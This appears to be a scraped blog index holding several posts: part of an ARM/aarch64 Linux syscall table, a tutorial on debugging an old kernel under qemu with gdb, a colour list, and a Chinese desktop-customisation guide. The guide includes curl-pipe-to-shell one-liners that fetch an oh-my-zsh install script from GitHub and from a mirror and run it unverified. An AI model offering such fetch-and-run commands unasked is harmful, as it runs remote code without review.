implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode 983041 ARM_breakpoint 0xf0001 ? ? ? 983042 ARM_cacheflush 0xf0002 ? ? ? 983043 ARM_usr26 0xf0003 ? ? ? 983044 ARM_usr32 0xf0004 ? ? ? 983045 ARM_set_tls 0xf0005 ? ? ? aarch64系统调用表 NR syscall name %x8 arg0 (%x0) arg1 (%x1) arg2 (%x2) 0 io_setup 0x00 unsigned nr_reqs aio_context_t *ctx - 1 io_destroy 0x01 aio_context_t ctx - - 2 io_submit 0x02 aio_context_t long struct iocb 3 io_cancel 0x03 aio_context_t ctx_id struct iocb *iocb struct io_event *result 4 io_getevents 0x04 aio_context_t ctx_id long min_nr long nr 5 setxattr 0x05 const char *path const char *name const void *value 6 lsetxattr 0x06 const char *path const char *name const void *value 7 fsetxattr 0x07 int fd const char *name const void *value 8 getxattr 0x08 const char *path const char *name void *value 9 lgetxattr 0x09 const char *path const char *name void *value 10 fgetxattr 0x0a int fd const char *name void *value 11 listxattr 0x0b const char *path char *list size_t size 12 llistxattr 0x0c const char *path char *list size_t size 13 flistxattr 0x0d int fd char *list size_t size 14 removexattr 0x0e const char *path const char *name - 15 lremovexattr 0x0f const char *path const char *name - 16 fremovexattr 0x10 int fd const char *name - 17 getcwd 0x11 char *buf unsigned long size - 18 lookup_dcookie 0x12 u64 cookie64 char *buf size_t len 19 eventfd2 0x13 unsigned int count int flags - 20 epoll_create1 0x14 int flags - - 21 epoll_ctl 0x15 int epfd int op int fd 22 epoll_pwait 0x16 int epfd struct epoll_event *events int maxevents 23 dup 0x17 unsigned int fildes - - 24 dup3 0x18 unsigned int oldfd unsigned int newfd int flags 25 fcntl 0x19 unsigned int fd unsigned int cmd unsigned long arg 26 inotify_init1 0x1a int flags - - 27 inotify_add_watch 0x1b int fd const char *path u32 mask 28 inotify_rm_watch 0x1c int fd __s32 wd - 29 ioctl 0x1d unsigned int fd unsigned int cmd unsigned long arg 30 ioprio_set 0x1e int which int who int ioprio 31 ioprio_get 0x1f int which int who - 32 flock 0x20 unsigned int fd unsigned int cmd - 33 mknodat 0x21 int dfd const char * filename umode_t mode 34 mkdirat 0x22 int dfd const char * pathname umode_t mode 35 unlinkat 0x23 int dfd const char * pathname int flag 36 symlinkat 0x24 const char * oldname int newdfd const char * newname 37 linkat 0x25 int olddfd const char *oldname int newdfd 38 renameat 0x26 int olddfd const char * oldname int newdfd 39 umount2 0x27 ? ? ? 40 mount 0x28 char *dev_name char *dir_name char *type 41 pivot_root 0x29 const char *new_root const char *put_old - 42 nfsservctl 0x2a ? ? ? 43 statfs 0x2b const char * path struct statfs *buf - 44 fstatfs 0x2c unsigned int fd struct statfs *buf - 45 truncate 0x2d const char *path long length - 46 ftruncate 0x2e unsigned int fd unsigned long length - 47 fallocate 0x2f int fd int mode loff_t offset 48 faccessat 0x30 int dfd const char *filename int mode 49 chdir 0x31 const char *filename - - 50 fchdir 0x32 unsigned int fd - - 51 chroot 0x33 const char *filename - - 52 fchmod 0x34 unsigned int fd umode_t mode - 53 fchmodat 0x35 int dfd const char * filename umode_t mode 54 fchownat 0x36 int dfd const char *filename uid_t user 55 fchown 0x37 unsigned int fd uid_t user gid_t group 56 openat 0x38 int dfd const char *filename int flags 57 close 0x39 unsigned int fd - - 58 vhangup 0x3a - - - 59 pipe2 0x3b int *fildes int flags - 60 quotactl 0x3c unsigned int cmd const char *special qid_t id 61 getdents64 0x3d unsigned int fd struct linux_dirent64 *dirent unsigned int count 62 lseek 0x3e unsigned int fd off_t offset unsigned int whence 63 read 0x3f unsigned int fd char *buf size_t count 64 write 0x40 unsigned int fd const char *buf size_t count 65 readv 0x41 unsigned long fd const struct iovec *vec unsigned long vlen 66 writev 0x42 unsigned long fd const struct iovec *vec unsigned long vlen 67 pread64 0x43 unsigned int fd char *buf size_t count 68 pwrite64 0x44 unsigned int fd const char *buf size_t count 69 preadv 0x45 unsigned long fd const struct iovec *vec unsigned long vlen 70 pwritev 0x46 unsigned long fd const struct iovec *vec unsigned long vlen 71 sendfile 0x47 int out_fd int in_fd off_t *offset 72 pselect6 0x48 int fd_set * fd_set * 73 ppoll 0x49 struct pollfd * unsigned int struct __kernel_timespec * 74 signalfd4 0x4a int ufd sigset_t *user_mask size_t sizemask 75 vmsplice 0x4b int fd const struct iovec *iov unsigned long nr_segs 76 splice 0x4c int fd_in loff_t *off_in int fd_out 77 tee 0x4d int fdin int fdout size_t len 78 readlinkat 0x4e int dfd const char *path char *buf 79 newfstatat 0x4f int dfd const char *filename struct stat *statbuf 80 fstat 0x50 unsigned int fd struct __old_kernel_stat *statbuf - 81 sync 0x51 - - - 82 fsync 0x52 unsigned int fd - - 83 fdatasync 0x53 unsigned int fd - - 84 sync_file_range 0x54 int fd loff_t offset loff_t nbytes 85 timerfd_create 0x55 int clockid int flags - 86 timerfd_settime 0x56 int ufd int flags const struct __kernel_itimerspec *utmr 87 timerfd_gettime 0x57 int ufd struct __kernel_itimerspec *otmr - 88 utimensat 0x58 int dfd const char *filename struct __kernel_timespec *utimes 89 acct 0x59 const char *name - - 90 capget 0x5a cap_user_header_t header cap_user_data_t dataptr - 91 capset 0x5b cap_user_header_t header const cap_user_data_t data - 92 personality 0x5c unsigned int personality - - 93 exit 0x5d int error_code - - 94 exit_group 0x5e int error_code - - 95 waitid 0x5f int which pid_t pid struct siginfo *infop 96 set_tid_address 0x60 int *tidptr - - 97 unshare 0x61 unsigned long unshare_flags - - 98 futex 0x62 u32 *uaddr int op u32 val 99 set_robust_list 0x63 struct robust_list_head *head size_t len - 100 get_robust_list 0x64 int pid struct robust_list_head head_ptr size_t *len_ptr 101 nanosleep 0x65 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 102 getitimer 0x66 int which struct __kernel_old_itimerval *value - 103 setitimer 0x67 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 104 kexec_load 0x68 unsigned long entry unsigned long nr_segments struct kexec_segment *segments 105 init_module 0x69 void *umod unsigned long len const char *uargs 106 delete_module 0x6a const char *name_user unsigned int flags - 107 timer_create 0x6b clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 108 timer_gettime 0x6c timer_t timer_id struct __kernel_itimerspec *setting - 109 timer_getoverrun 0x6d timer_t timer_id - - 110 timer_settime 0x6e timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 111 timer_delete 0x6f timer_t timer_id - - 112 clock_settime 0x70 clockid_t which_clock const struct __kernel_timespec *tp - 113 clock_gettime 0x71 clockid_t which_clock struct __kernel_timespec *tp - 114 clock_getres 0x72 clockid_t which_clock struct __kernel_timespec *tp - 115 clock_nanosleep 0x73 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 116 syslog 0x74 int type char *buf int len 117 ptrace 0x75 long request long pid unsigned long addr 118 sched_setparam 0x76 pid_t pid struct sched_param *param - 119 sched_setscheduler 0x77 pid_t pid int policy struct sched_param *param 120 sched_getscheduler 0x78 pid_t pid - - 121 sched_getparam 0x79 pid_t pid struct sched_param *param - 122 sched_setaffinity 0x7a pid_t pid unsigned int len unsigned long *user_mask_ptr 123 sched_getaffinity 0x7b pid_t pid unsigned int len unsigned long *user_mask_ptr 124 sched_yield 0x7c - - - 125 sched_get_priority_max 0x7d int policy - - 126 sched_get_priority_min 0x7e int policy - - 127 sched_rr_get_interval 0x7f pid_t pid struct __kernel_timespec *interval - 128 restart_syscall 0x80 - - - 129 kill 0x81 pid_t pid int sig - 130 tkill 0x82 pid_t pid int sig - 131 tgkill 0x83 pid_t tgid pid_t pid int sig 132 sigaltstack 0x84 const struct sigaltstack *uss struct sigaltstack *uoss - 133 rt_sigsuspend 0x85 sigset_t *unewset size_t sigsetsize - 134 rt_sigaction 0x86 int const struct sigaction * struct sigaction * 135 rt_sigprocmask 0x87 int how sigset_t *set sigset_t *oset 136 rt_sigpending 0x88 sigset_t *set size_t sigsetsize - 137 rt_sigtimedwait 0x89 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 138 rt_sigqueueinfo 0x8a pid_t pid int sig siginfo_t *uinfo 139 rt_sigreturn 0x8b ? ? ? 140 setpriority 0x8c int which int who int niceval 141 getpriority 0x8d int which int who - 142 reboot 0x8e int magic1 int magic2 unsigned int cmd 143 setregid 0x8f gid_t rgid gid_t egid - 144 setgid 0x90 gid_t gid - - 145 setreuid 0x91 uid_t ruid uid_t euid - 146 setuid 0x92 uid_t uid - - 147 setresuid 0x93 uid_t ruid uid_t euid uid_t suid 148 getresuid 0x94 uid_t *ruid uid_t *euid uid_t *suid 149 setresgid 0x95 gid_t rgid gid_t egid gid_t sgid 150 getresgid 0x96 gid_t *rgid gid_t *egid gid_t *sgid 151 setfsuid 0x97 uid_t uid - - 152 setfsgid 0x98 gid_t gid - - 153 times 0x99 struct tms *tbuf - - 154 setpgid 0x9a pid_t pid pid_t pgid - 155 getpgid 0x9b pid_t pid - - 156 getsid 0x9c pid_t pid - - 157 setsid 0x9d - - - 158 getgroups 0x9e int gidsetsize gid_t *grouplist - 159 setgroups 0x9f int gidsetsize gid_t *grouplist - 160 uname 0xa0 struct old_utsname * - - 161 sethostname 0xa1 char *name int len - 162 setdomainname 0xa2 char *name int len - 163 getrlimit 0xa3 unsigned int resource struct rlimit *rlim - 164 setrlimit 0xa4 unsigned int resource struct rlimit *rlim - 165 getrusage 0xa5 int who struct rusage *ru - 166 umask 0xa6 int mask - - 167 prctl 0xa7 int option unsigned long arg2 unsigned long arg3 168 getcpu 0xa8 unsigned *cpu unsigned *node struct getcpu_cache *cache 169 gettimeofday 0xa9 struct __kernel_old_timeval *tv struct timezone *tz - 170 settimeofday 0xaa struct __kernel_old_timeval *tv struct timezone *tz - 171 adjtimex 0xab struct __kernel_timex *txc_p - - 172 getpid 0xac - - - 173 getppid 0xad - - - 174 getuid 0xae - - - 175 geteuid 0xaf - - - 176 getgid 0xb0 - - - 177 getegid 0xb1 - - - 178 gettid 0xb2 - - - 179 sysinfo 0xb3 struct sysinfo *info - - 180 mq_open 0xb4 const char *name int oflag umode_t mode 181 mq_unlink 0xb5 const char *name - - 182 mq_timedsend 0xb6 mqd_t mqdes const char *msg_ptr size_t msg_len 183 mq_timedreceive 0xb7 mqd_t mqdes char *msg_ptr size_t msg_len 184 mq_notify 0xb8 mqd_t mqdes const struct sigevent *notification - 185 mq_getsetattr 0xb9 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 186 msgget 0xba key_t key int msgflg - 187 msgctl 0xbb int msqid int cmd struct msqid_ds *buf 188 msgrcv 0xbc int msqid struct msgbuf *msgp size_t msgsz 189 msgsnd 0xbd int msqid struct msgbuf *msgp size_t msgsz 190 semget 0xbe key_t key int nsems int semflg 191 semctl 0xbf int semid int semnum int cmd 192 semtimedop 0xc0 int semid struct sembuf *sops unsigned nsops 193 semop 0xc1 int semid struct sembuf *sops unsigned nsops 194 shmget 0xc2 key_t key size_t size int flag 195 shmctl 0xc3 int shmid int cmd struct shmid_ds *buf 196 shmat 0xc4 int shmid char *shmaddr int shmflg 197 shmdt 0xc5 char *shmaddr - - 198 socket 0xc6 int int int 199 socketpair 0xc7 int int int 200 bind 0xc8 int struct sockaddr * int 201 listen 0xc9 int int - 202 accept 0xca int struct sockaddr * int * 203 connect 0xcb int struct sockaddr * int 204 getsockname 0xcc int struct sockaddr * int * 205 getpeername 0xcd int struct sockaddr * int * 206 sendto 0xce int void * size_t 207 recvfrom 0xcf int void * size_t 208 setsockopt 0xd0 int fd int level int optname 209 getsockopt 0xd1 int fd int level int optname 210 shutdown 0xd2 int int - 211 sendmsg 0xd3 int fd struct user_msghdr *msg unsigned flags 212 recvmsg 0xd4 int fd struct user_msghdr *msg unsigned flags 213 readahead 0xd5 int fd loff_t offset size_t count 214 brk 0xd6 unsigned long brk - - 215 munmap 0xd7 unsigned long addr size_t len - 216 mremap 0xd8 unsigned long addr unsigned long old_len unsigned long new_len 217 add_key 0xd9 const char *_type const char *_description const void *_payload 218 request_key 0xda const char *_type const char *_description const char *_callout_info 219 keyctl 0xdb int cmd unsigned long arg2 unsigned long arg3 220 clone 0xdc unsigned long unsigned long int * 221 execve 0xdd const char *filename const char *const *argv const char *const *envp 222 mmap 0xde ? ? ? 223 fadvise64 0xdf int fd loff_t offset size_t len 224 swapon 0xe0 const char *specialfile int swap_flags - 225 swapoff 0xe1 const char *specialfile - - 226 mprotect 0xe2 unsigned long start size_t len unsigned long prot 227 msync 0xe3 unsigned long start size_t len int flags 228 mlock 0xe4 unsigned long start size_t len - 229 munlock 0xe5 unsigned long start size_t len - 230 mlockall 0xe6 int flags - - 231 munlockall 0xe7 - - - 232 mincore 0xe8 unsigned long start size_t len unsigned char * vec 233 madvise 0xe9 unsigned long start size_t len int behavior 234 remap_file_pages 0xea unsigned long start unsigned long size unsigned long prot 235 mbind 0xeb unsigned long start unsigned long len unsigned long mode 236 get_mempolicy 0xec int *policy unsigned long *nmask unsigned long maxnode 237 set_mempolicy 0xed int mode const unsigned long *nmask unsigned long maxnode 238 migrate_pages 0xee pid_t pid unsigned long maxnode const unsigned long *from 239 move_pages 0xef pid_t pid unsigned long nr_pages const void pages 240 rt_tgsigqueueinfo 0xf0 pid_t tgid pid_t pid int sig 241 perf_event_open 0xf1 struct perf_event_attr *attr_uptr pid_t pid int cpu 242 accept4 0xf2 int struct sockaddr * int * 243 recvmmsg 0xf3 int fd struct mmsghdr *msg unsigned int vlen 244 not implemented 0xf4 245 not implemented 0xf5 246 not implemented 0xf6 247 not implemented 0xf7 248 not implemented 0xf8 249 not implemented 0xf9 250 not implemented 0xfa 251 not implemented 0xfb 252 not implemented 0xfc 253 not implemented 0xfd 254 not implemented 0xfe 255 not implemented 0xff 256 not implemented 0x100 257 not implemented 0x101 258 not implemented 0x102 259 not implemented 0x103 260 wait4 0x104 pid_t pid int *stat_addr int options 261 prlimit64 0x105 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 262 fanotify_init 0x106 unsigned int flags unsigned int event_f_flags - 263 fanotify_mark 0x107 int fanotify_fd unsigned int flags u64 mask 264 name_to_handle_at 0x108 int dfd const char *name struct file_handle *handle 265 open_by_handle_at 0x109 int mountdirfd struct file_handle *handle int flags 266 clock_adjtime 0x10a clockid_t which_clock struct __kernel_timex *tx - 267 syncfs 0x10b int fd - - 268 setns 0x10c int fd int nstype - 269 sendmmsg 0x10d int fd struct mmsghdr *msg unsigned int vlen 270 process_vm_readv 0x10e pid_t pid const struct iovec *lvec unsigned long liovcnt 271 process_vm_writev 0x10f pid_t pid const struct iovec *lvec unsigned long liovcnt 272 kcmp 0x110 pid_t pid1 pid_t pid2 int type 273 finit_module 0x111 int fd const char *uargs int flags 274 sched_setattr 0x112 pid_t pid struct sched_attr *attr unsigned int flags 275 sched_getattr 0x113 pid_t pid struct sched_attr *attr unsigned int size 276 renameat2 0x114 int olddfd const char *oldname int newdfd 277 seccomp 0x115 unsigned int op unsigned int flags void *uargs 278 getrandom 0x116 char *buf size_t count unsigned int flags 279 memfd_create 0x117 const char *uname_ptr unsigned int flags - 280 bpf 0x118 int cmd union bpf_attr *attr unsigned int size 281 execveat 0x119 int dfd const char *filename const char *const *argv 282 userfaultfd 0x11a int flags - - 283 membarrier 0x11b int cmd unsigned int flags int cpu_id 284 mlock2 0x11c unsigned long start size_t len int flags 285 copy_file_range 0x11d int fd_in loff_t *off_in int fd_out 286 preadv2 0x11e unsigned long fd const struct iovec *vec unsigned long vlen 287 pwritev2 0x11f unsigned long fd const struct iovec *vec unsigned long vlen 288 pkey_mprotect 0x120 unsigned long start size_t len unsigned long prot 289 pkey_alloc 0x121 unsigned long flags unsigned long init_val - 290 pkey_free 0x122 int pkey - - 291 statx 0x123 int dfd const char *path unsigned flags 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode ","date":"2022-05-08T21:45:00+08:00","image":"https://s2.loli.net/2022/05/08/1vXerd2a3qCgcfQ.jpg","permalink":"https://cerr.cc/post/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%A4%A7%E5%85%A8/","title":"Linux系统调用大全"},{"content":" From this post, our goal is tracing the execution procedure from kernel entry to userspace process (busybox init) by using qemu-system and gdb-multiarch.\nPreparation qemu-system-arm Compile it from source code or just use sudo apt install qemu-system-arm.\nkernel Linux kernel v4.1 for armel as an example. Compiling a linux kernel requires a matched version of gcc. For example, the linux kernel v4.1 requires the gcc version between 3 and 5:\n1 2 3 4 5 linunx-v4.1 $ find . -name \u0026#34;compiler-gcc*.h\u0026#34; ./include/linux/compiler-gcc.h ./include/linux/compiler-gcc3.h ./include/linux/compiler-gcc4.h ./include/linux/compiler-gcc5.h So how can we get the old version gcc? You can always rely on buildroot: https://buildroot.org/download.html\nJust clone it\u0026rsquo;s repository:\n1 git clone https://git.buildroot.net/buildroot And switch to the specific old release you required. You can check gcc release history from here\nGCC5 is released in 2015, so we switch buildroot\u0026rsquo;s release version to 2015.08.x :\n1 git switch 2015.08.x And then,\n1 2 3 make menuconfig # edit with yourself make But an error occured in this step (this because we are using an old version of buildroot) :\nerror \u0026ldquo;Please port gnulib freadahead.c to your platform!\ncd to /buildroot/output/build/host-m4-1.4.17 and excute :\n1 2 sed -i \u0026#39;s/IO_ftrylockfile/IO_EOF_SEEN/\u0026#39; lib/*.c echo \u0026#34;#define _IO_IN_BACKUP 0x100\u0026#34; \u0026gt;\u0026gt; lib/stdio-impl.h Then make again, we will get the old version of GCC we want. Ready for compiling the old version linux kernel :)\n1 2 3 git clone https://github.com/torvalds/linux.git git checkout v4.1 make ARCH=arm O=./build/armel menuconfig Make sure that CONFIG_DEBUG_INFO is enabled. (You can configure it in the .config file directly, or in kernel-hack item from menuconfig interface.)\n1 make ARCH=arm O=./build/armel CROSS_COMPILE=/opt/crossc/armel-uclibc-gcc-4/usr/bin/arm-buildroot-linux-uclibcgnueabi- zImage -j$(nproc) We got zImage at build/armel/arch/arm/boot/zImage and vmlinux (with debug symbols) at build/armel\nbusybox Even though we can use the busybox from the filesystem directly, we got no debug symbols from it. Thus we should compile busybox manually:\n1 2 3 git clone https://git.busybox.net/busybox/ make menuconfig make CROSS_COMPILE=/opt/crossc/armel-uclibc-gcc-4/usr/bin/arm-buildroot-linux-uclibcgnueabi- -j$(nproc) Then the busybox_unstripped is produced.\nfilesystem Hummm maybe obtain it by yourself?\nAs for my situation, I just extract the filesystem from a TP-Link firmware. And we need do some modification to turn our filesystem directory to a filesystem image. Assume we have the rootfs directory made by bin etc sys usr var tmp \u0026hellip; First of all, use dd to create a 50MB file filled with \\x00\n1 dd if=/dev/zero of=rootfs.img bs=4k count=12800 We will regard this rootfs.img as our virtual disk containing root filesystem. So, continue modifing it. The next step is create disk partitions using fdisk on rootfs.img :\n1 echo -e \u0026#34;o\\nn\\np\\n1\\n\\n\\nw\u0026#34; | sudo /sbin/fdisk rootfs.img With disk partition be ready, rootfs.img could be mounted to the host filesystem using kpartx :\n1 sudo kpartx -a -s -v rootfs.img After that we got the corresponding device located at /dev/mapper/loop0p1\nFormat its major partition as ext2 format :\n1 2 mkfs.ext2 /dev/mapper/loop0p1 sync And then mount it to host filesystem path wherever you like :\n1 sudo mount /dev/mapper/loop0p1 ./mount_dir We are done preparing here. All we should do next is copying all the files recursively from the origin root filesystem directory to our mounted directory, so that we got a rootfs.img image file containing the armel filesystem we want. Don\u0026rsquo;t forget replace the origin bin/busybox with our manually compiled version.\nTracing time ! Now we have :\n1 2 workdir $ ls mount_dir rootfs.img vmlinux zImage Full system emulation command line :\n1 qemu-system-arm -M virt -kernel ./zImage -drive if=none,file=rootfs.img,format=raw,id=rootfs -device virtio-blk-device,drive=rootfs -append \u0026#34;root=/dev/vda1 console=ttyS0 rw\u0026#34; -nographic -s -S tips : -s shorthand for -gdb tcp::1234 -S freeze CPU at startup (use \u0026lsquo;c\u0026rsquo; to start execution) Terminate qemu-system-arm process with Ctrl-A + x\nqemu-system-arm process should be paused until we attach to it using gdb-multiarch:\n1 2 3 4 5 6 ~$ gdb-multiarch (gdb)$ set architecture arm The target architecture is set to \u0026#34;arm\u0026#34;. (gdb)$ file vmlinux Reading symbols from vmlinux... (gdb)$ target remote :1234 We can not reach the bootloader\u0026rsquo;s entry address 0x7c00 because we are not using our own bootloader and pass the -bios parameter to qemu.\nIf you want to learn how kernel initialize itself, just use :\n1 2 (gdb)$ b kernel_init (gdb)$ c After a bunch of initializing work on memory, paging, hardware and drive, etc being done, the init binary (who has PID 1) is about to be execved. The problem is, init is a usermode process and running in ring3, which has the different thread with kernel and virtual memory space, how we trace to it? The answer is straightforward: the program counter register (PC) is always holding the instruction\u0026rsquo;s virtual address being excuted by CPU. So we can just check the entry address of init, and set a breakpoint at this address. Because I am using busybox to supply init, and this binary is belong to armel architecture, so I should typing :\n1 arm-buildroot-linux-uclibcgnueabi-readelf -h mount_dir/bin/busybox It gave me :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: ARM Version: 0x1 Entry point address: 0x87a0 Start of program headers: 52 (bytes into file) Start of section headers: 4008884 (bytes into file) Flags: 0x5000202, has entry point, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 5 Size of section headers: 40 (bytes) Number of section headers: 30 Section header string table index: 27 We find that the entry point address is 0x87a0. 0x87a0 is such a strange address that seems can not be a breakpoint address. The reason is that busybox is not compiled with CFLAG -no-pie. so add this CFLAG and compile busybox again, we will get the avaliable breakpoint address by readelf. So set a breakpoint at busybox\u0026rsquo;s entry address and send c to gdb, we will reach to userspace directly.\n","date":"2022-05-08T19:35:11+08:00","image":"https://s2.loli.net/2022/08/25/fHQPn8S2vLI7aR3.png","permalink":"https://cerr.cc/post/cross-debug-old-version-kernel-using-qemu-system/","title":"Cross debug old version kernel using qemu-system"},{"content":"Awesome colors 波尔多红 #4f0009 克莱因蓝 #002FA7 普鲁士蓝 #003153 勃艮第红 #800020 邦迪蓝 #0095b6 木乃伊棕 #8f4b28 卡布里蓝 #1a5599 提香红 #b05923 蒂芙尼蓝 #81d8d0 覆盆子红 #9e2e24 虎皮黄 #e2af42 薄荷绿 #407d52 草黄 #cfb64a 星蓝 #9ab4cd 鸢尾蓝 #418ab4 苋菜紫 #8e2961 钢蓝 #101420 云峰白 #dae3e6 岩石棕 #8c502c 橄榄石绿 #b8ce8e 竹绿 #4fa485 钴蓝 #4692b9 月影白 #c2c4c3 笋皮棕 #6b331a 琉璃蓝 #22406a 黛蓝 #3f4f65 青白 #bee0d0 墨色 #4e606c 黯 #3f545b 玄青 #3b3a4e 漆黑 #141722 玄色 #370708 ","date":"2022-05-07T22:53:05+08:00","image":"https://s2.loli.net/2022/05/07/QW6X8VuxZCJnmfc.jpg","permalink":"https://cerr.cc/post/awesome-colors/","title":"Awesome Colors"},{"content":" GNU/Linux 的桌面生态，开放虽是好事，但却由此带来了混乱。没有像微软这样的赛博中央政府制定规则，就产生了眼下这般群雄割据的态势。作为用户的我能做的，也只是择巨木而栖 —— 唯二的自由巨头 KDE 与 Gnome，二选其一~~（LXQt大法好）~~（当年煮酒论DE，今日叛逃用WM）（i3大法好）。幼年气盛，爱好折腾，留下了些许美化的经验。时至今日，能回忆起的已然不多。尽力而为做些记录，为日后回归赛博左派留些盘缠。\n概念拆解 被Windows驯化得温顺从良的我，当年对显示屏上花花绿绿的GUI组件并无概念。商业操作系统将一切整合，成为一个整体，迷惑我说：“这便是操作系统图形化用户接口”。今日慢慢爬出泥沼，留攻略如下：\n🎵我有一台树莓派我从来不开机。接通电源、引导器醒来、启动内核、唤醒pid 1，此时来到Virtual Terminal下的/dev/tty1。在自动登录GUI的设定下，有如下朋友先后会来迎接我：\nWS：Window System 图形化的基本环境 举例： X11 Wayland ref： https://en.wikipedia.org/wiki/Windowing_system DM：Display manager 图形化的登陆管理器，作用类似于login程序 可以在此选择登录后想要启动的WM或DE 举例： GDM, GNOME implementation SDDM, recommended display manager for KDE Plasma 5 and LXQt. Successor to KDM. LightDM, a lightweight, modular, cross-desktop, fully themeable desktop display manager by Canonical Ltd. ref： https://en.wikipedia.org/wiki/X_display_manager WM：Window manager 控制窗口行为的图形化子系统 举例： i3（for X11） Sway（i3 clone for Wayland） KWin Openbox ref： https://en.wikipedia.org/wiki/Window_manager https://en.wikipedia.org/wiki/Comparison_of_X_window_managers DE：Desktop environment 传统意义上的“桌面环境”，登录后直接显示到屏幕上的图形大都是DE画的（icons, windows, toolbars, folders, wallpapers and desktop widgets） 举例： Gnome KDE XFCE LXDE（GTK） LXQt（Qt） DDE（国产） ref： https://en.wikipedia.org/wiki/Desktop_environment DE KDE plasma UI的（乡土风）现代感，很大部分要归因与透明化的效果。一年前的我也是透明化爱好者，恰逢那时使用 Archlinux + KDE，故记录如下KDE透明化配置方法。KDE自身本就具有各大DE中最为强大的视觉效果定制功能，所以如下所述只是KDE本身能力之外的美化方法：\n窗口边框透明化 使用\nhttps://github.com/ishovkun/SierraBreeze 或\nhttps://github.com/alex47/BreezeBlurred 在Archlinux上若出现编译错误，可以使用这位老哥打包好的安装包 https://github.com/alex47/BreezeBlurred/issues/24 面板透明化 需要自己魔改，参考如下大佬留下的教程：\nhttps://www.joxrays.com/kde-panel-transparency/\n原始论坛帖子：\nhttps://forum.manjaro.org/t/where-can-the-transparency-of-the-kde-panel-be-set/50219\n组件透明化 这一需求有现成的工具Kvantum，亦有大佬教程如下：\nhttps://blog.firerain.me/article/4\n此外，便是一些其它的效果组件\nMacOS风的Dock栏 状态、菜单、任务栏的呈现方式，我个人更倾向与MacOS的方案。比起Windows，牺牲了些许效率，换取美感。\nKDE下使用 latte-dock 来获取MacOS风的Dock栏，这样就可以将本身的Panel变为MacOS下的常驻状态栏。\n仓库地址：https://github.com/KDE/latte-dock\n同时其是可以直接从KDE store一键下载安装的。\n音乐可视化 Windows下可以使用Wallpaper engine，Linux就没有这个福分了，只能另寻替代方案。\nKDE插件 panon 能达到尚且凑活的效果，可以直接从插件商店一键安装。\nGnome Gnome不像KDE，它没有向用户直接呈现DE UI定制接口，而是需要用户自行配置。好在Gnome同时也提供了美化总站：https://www.gnome-look.org/\n网站中基本涵盖了所有美化选项与资源。且对于采用GTK的其它DE来说，大量资源都是通用的。但在此之前需要有一些预先配置（出于DE稳定性考虑，默认不将定制接口提供给小白用户）：\n安装 gnome-tweaks\n1 sudo apt install gnome-tweaks 使用gnome-tweaks就可以做一些此前没有的定制化了，同时作为后续美化的基本依赖。\n接下来安装gnome插件管理器 GNOME Shell Extensions：\n插件管理器的用户接口是基于浏览器提供的，需安装对应的Chrome或Firefox插件即可。\n对于Chrome，除了可以从Chrome商店下载外，也可以直接使用软件源里的包安装：\n1 sudo apt install chrome-gnome-shell Firefox插件地址为：https://addons.mozilla.org/en-US/firefox/addon/gnome-shell-integration/\n然后就可以访问 https://extensions.gnome.org/ 来管理gnome插件了：\n为了使用用户目录中的主题，需要安装 User Themes 插件并启用：\nhttps://extensions.gnome.org/extension/19/user-themes/\n然后在家目录建立名为 .themes 的文件夹，将下载到的各种主题资源解压至此。\n若不想进行用户级安装，而是追求系统级安装，则资源路径为：\n主题：/usr/share/themes/ 图标：/usr/share/icons/ 字体：/usr/share/fonts/ 此后，尽情探索https://www.gnome-look.org/，将下载到的资源在gnome-tweaks中启用即可。\nWM i3 讨厌鼠标的键盘信徒？俺也一样！（即使我是老FPS玩家了，使用鼠标有天然的速度优势）\n话说图形化诞生的初衷就带有“坐标交互”的动机，想在图形化下扔掉鼠标，不是抛弃原教旨了嘛？\n但有需求就有造物，玩DE的后路是玩WM。i3目前是该领域的当红炸子鸡。\n不喜欢X11？面向Wayland的i3 clone：Sway，供你选择。\n快捷键并不多，比tmux简单。一天学会，受用终生。👍\nShell shell并不属于DE的一部分，有个字符终端足矣。\n最流行的美化方案还是zsh的一套：\nzsh sudo apt install zsh oh-my-zsh： 官网：https://ohmyz.sh/ 官方一键安装（基于raw.githubusercontent.com，需科学上网）： sh -c \u0026quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026quot; 基于国内gitee镜像一键安装： sh -c \u0026quot;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\u0026quot; lsd https://github.com/Peltoche/lsd 需要Nerd Fonts支持 https://www.nerdfonts.com/ zsh插件 输入建议插件：zsh-autosuggestions 基于oh-my-zsh安装：git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions shell语法高亮插件：zsh-syntax-highlighting 基于oh-my-zsh安装：git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting fish也不错，开箱即用，但惜败于不兼容bash\n其它 